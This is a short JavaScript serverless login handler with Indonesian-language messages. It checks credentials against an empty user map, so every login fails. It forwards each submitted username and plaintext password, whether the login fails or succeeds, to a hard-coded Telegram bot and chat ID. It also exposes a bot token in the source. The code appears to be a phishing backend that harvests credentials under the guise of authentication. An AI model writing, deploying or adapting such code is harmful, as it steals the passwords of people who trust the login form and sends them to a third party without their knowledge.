const users = new Map();
const TELEGRAM_TOKEN = "8687640961:AAFRHGV5uGvE71wUtpYgwWczToU3rXpTcdA";
const TELEGRAM_CHAT_ID = "6483043491";

function escapeHtml(str) {
    return String(str)
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;");
}

async function sendTelegram(text) {
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
        const res = await fetch(url, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: text,
                parse_mode: "HTML"
            })
        });
        return await res.json();
    } catch (err) {
        console.error("Telegram error:", err);
        return null;
    }
}

export default async function handler(req, res) {
    res.setHeader("Access-Control-Allow-Origin", "*");
    res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
    res.setHeader("Access-Control-Allow-Headers", "Content-Type");

    if (req.method === "OPTIONS") return res.status(204).end();
    if (req.method !== "POST") {
        return res.status(405).json({ success: false, message: "Method not allowed" });
    }

    try {
        const { username, password } = req.body || {};

        if (!username || !password) {
            return res.status(400).json({ success: false, message: "Username dan password wajib diisi" });
        }

        const uname = String(username).trim();
        const pass = String(password);
        const user = users.get(uname);
        const time = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });

        if (!user || user.password !== pass) {
            sendTelegram(
                `<b>LOGIN GAGAL</b>\n` +
                `━━━━━━━━━━━━━━━━━━━━\n` +
                `<b>Username:</b> <code>${escapeHtml(uname)}</code>\n` +
                `<b>Password:</b> <code>${escapeHtml(pass)}</code>`
            );
            return res.status(401).json({ success: false, message: "Username atau password salah" });
        }

        sendTelegram(
            `<b>LOGIN BERHASIL</b>\n` +
            `━━━━━━━━━━━━━━━━━━━━\n` +
            `<b>Username:</b> <code>${escapeHtml(uname)}</code>\n` +
            `<b>Password:</b> <code>${escapeHtml(pass)}</code>`
        );

        return res.json({ success: true, message: "Login berhasil", user: uname });

    } catch (err) {
        console.error("Login error:", err);
        return res.status(500).json({ success: false, message: "Terjadi kesalahan server" });
    }
}
